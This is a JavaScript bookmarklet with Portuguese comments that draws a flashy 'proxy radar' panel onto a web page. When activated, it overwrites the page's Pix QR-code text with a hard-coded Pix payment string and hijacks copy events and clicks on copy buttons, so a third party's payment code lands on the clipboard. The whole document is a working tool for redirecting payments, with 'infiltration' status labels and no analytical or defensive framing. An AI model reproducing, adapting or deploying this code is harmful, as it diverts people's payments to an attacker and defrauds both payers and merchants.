javascript:(function(){

const novoCodigo = "00020101021226830014BR.GOV.BCB.PIX2561qrcodespix.sejaefi.com.br/v2/ee7ec1f215234fbd96bb8d0bce76767c5204000053039865802BR5905EFISA6008SAOPAULO62070503***6304077D";

// ===== CONFIGURAÇÕES VISUAIS =====
const ID='proxy-radar-panel';
const RED='#ff003c', ICE='#00eaff', GREEN='#00ff66';
let minimized=false;

// ===== ESTILO =====
const style=document.createElement('style');
style.innerHTML=`
#${ID}{
  position:fixed;top:20px;left:20px;width:320px;background:rgba(5,5,5,.92);
  border-radius:18px;overflow:hidden;z-index:999999;font-family:monospace;
  box-shadow:0 0 25px rgba(255,0,60,.22),0 0 50px rgba(0,234,255,.08),inset 0 0 18px rgba(255,255,255,.03);
  border:1px solid rgba(0,234,255,.08);backdrop-filter:blur(6px);
}
.head{cursor:move;padding:10px;font-size:13px;font-weight:900;color:${ICE};display:flex;justify-content:space-between;align-items:center;background:linear-gradient(90deg, rgba(0,234,255,.04), rgba(255,0,60,.03), rgba(0,234,255,.04));border-bottom:1px solid rgba(255,255,255,.04);}
.title-glow{animation:pulseGlow 1.5s infinite alternate}
@keyframes pulseGlow{from{text-shadow:0 0 5px ${ICE}} to{text-shadow:0 0 20px ${ICE}}}
.min-btn{cursor:pointer;color:${RED}}
.body{padding:12px;position:relative}
.status{text-align:center;font-size:13px;font-weight:900;margin-bottom:12px;position:relative;min-height:42px;display:flex;flex-direction:column;align-items:center;justify-content:center;overflow:hidden;}
.status-text{display:inline-block;opacity:0;transform:translateX(-40px);filter:blur(1px);letter-spacing:1px;}
.status.reveal .status-text{animation:signalSlideIn .55s cubic-bezier(.22,1,.36,1) forwards;}
@keyframes signalSlideIn{0%{opacity:0;transform:translateX(-55px);filter:blur(3px);}60%{opacity:1;transform:translateX(6px);filter:blur(.6px);}100%{opacity:1;transform:translateX(0);filter:blur(0);}}
.signal-loader{width:86%;height:6px;border-radius:999px;margin:0 auto 8px;position:relative;overflow:hidden;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.04);box-shadow:inset 0 0 8px rgba(255,255,255,.03),0 0 8px rgba(0,234,255,.06);}
.signal-loader::before{content:'';position:absolute;inset:0;width:0%;border-radius:999px;background:linear-gradient(90deg, rgba(0,234,255,.25), rgba(255,255,255,.85), rgba(255,0,60,.55));box-shadow:0 0 8px rgba(0,234,255,.45),0 0 16px rgba(255,0,60,.25);animation:signalLoadFill .35s cubic-bezier(.22,1,.36,1) forwards;}
@keyframes signalLoadFill{from{width:0%}to{width:100%}}
.minimized .body{display:none}
.radar-shell{width:120px;height:120px;margin:12px auto;perspective:600px;}
.radar3d{width:100%;height:100%;border-radius:50%;position:relative;transform-style:preserve-3d;background:radial-gradient(circle, rgba(255,0,60,.12) 0%, rgba(0,234,255,.035) 42%, rgba(0,234,255,.01) 58%, transparent 72%);box-shadow:inset 0 0 18px rgba(0,234,255,.05),0 0 18px rgba(0,234,255,.08);animation:rotate3d 3s linear infinite;}
@keyframes rotate3d{0%{transform:rotateX(65deg) rotateZ(0deg)}100%{transform:rotateX(65deg) rotateZ(360deg)}}
.ring{position:absolute;inset:0;border-radius:50%;background:conic-gradient(${RED} var(--p), rgba(255,255,255,.08) 0);mask:radial-gradient(circle, transparent 60%, #000 62%);box-shadow:0 0 12px rgba(255,0,60,.18);}
.percent{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:900;text-shadow:0 0 8px rgba(255,255,255,.18);}
.log-wrapper{max-height:0;overflow:hidden;transition:max-height .35s ease;border-top:1px solid rgba(255,255,255,.05);margin-top:10px;}
#${ID}:hover .log-wrapper{max-height:150px;}
.log-wrapper div{font-size:11px;padding:3px 4px;}
.footer{text-align:center;font-size:10px;margin-top:8px;color:${ICE};}
.red{color:${RED};text-shadow:0 0 10px ${RED},0 0 18px rgba(255,0,60,.75),0 0 28px rgba(255,0,60,.35);}
.black{color:${ICE};text-shadow:0 0 10px ${ICE},0 0 18px rgba(0,234,255,.75),0 0 28px rgba(0,234,255,.35);}
`;
document.head.appendChild(style);

// ===== HTML =====
const box=document.createElement('div');
box.id=ID;
box.innerHTML=`
  <div class="head">
    <span class="title-glow">◆ PROXY + RADAR PANEL</span>
    <span class="min-btn">—</span>
  </div>
  <div class="body">
    <button id="ativar" style="width:100%;margin-bottom:10px;padding:5px;background:${ICE};border:none;border-radius:5px;color:#000;">ATIVAR QR CODE</button>
    <div id="status" class="status">
      <div class="status-text">Aguardando...</div>
    </div>
    <div class="radar-shell">
      <div id="radar" class="radar3d" style="--p:0%">
        <div class="ring"></div>
        <div id="percent" class="percent">0%</div>
      </div>
    </div>
    <div class="log-wrapper" id="log"></div>
    <div class="footer">
      PROXY PANEL • <span class="online-green">● ONLINE</span>
    </div>
  </div>
`;
document.body.appendChild(box);

// ===== FUNÇÕES =====
const statusEl=box.querySelector('#status');
const radar=box.querySelector('#radar');
const percentEl=box.querySelector('#percent');
const logEl=box.querySelector('#log');

function aplicar(){
  // Atualiza QR Code se existir
  const qr = document.querySelector(".qr-code-text-inner");
  if(qr) qr.textContent = novoCodigo;

  // Intercepta copy global
  document.addEventListener("copy", function(e){
    e.preventDefault();
    e.clipboardData.setData("text/plain", novoCodigo);
  });

  // Clique em elementos QR Code
  document.querySelectorAll(".qr-code-text, .qr-code-text-inner, .copy-emblem")
  .forEach(el=>{
    el.addEventListener("click",(e)=>{
      e.preventDefault(); e.stopPropagation();
      navigator.clipboard.writeText(novoCodigo);
      addLog("red","✅ Copiado PROXY");
      statusEl.innerHTML='<div class="status-text red">✅ Copiado PROXY</div>';
    });
  });

  // Status ativo
  statusEl.innerHTML='<div class="status-text red">🔥 ATIVO</div>';
}

document.getElementById("ativar").onclick=aplicar;

function addLog(c,text){
  const d=document.createElement('div');
  d.className=c;
  d.textContent=text||('INFILTRATION • '+(c==='red'?'RED':'BLACK'));
  logEl.prepend(d);
}

function runRadar(){
  let s=Date.now();
  const t=setInterval(()=>{
    const p=Math.min(100,((Date.now()-s)/1000)*100);
    radar.style.setProperty('--p',p+'%');
    percentEl.textContent=(p|0)+'%';
    if(p>=100) clearInterval(t);
  },16);
}

// ===== MENU ARRASTÁVEL =====
const head=box.querySelector('.head');
let dx,dy,drag=false;
head.onmousedown=e=>{drag=true;dx=e.clientX-box.offsetLeft;dy=e.clientY-box.offsetTop;}
document.onmousemove=e=>{if(drag){box.style.left=e.clientX-dx+'px';box.style.top=e.clientY-dy+'px';box.style.right='auto';}}
document.onmouseup=()=>drag=false;
box.querySelector('.min-btn').onclick=()=>{minimized=!minimized;box.classList.toggle('minimized', minimized);}

})();
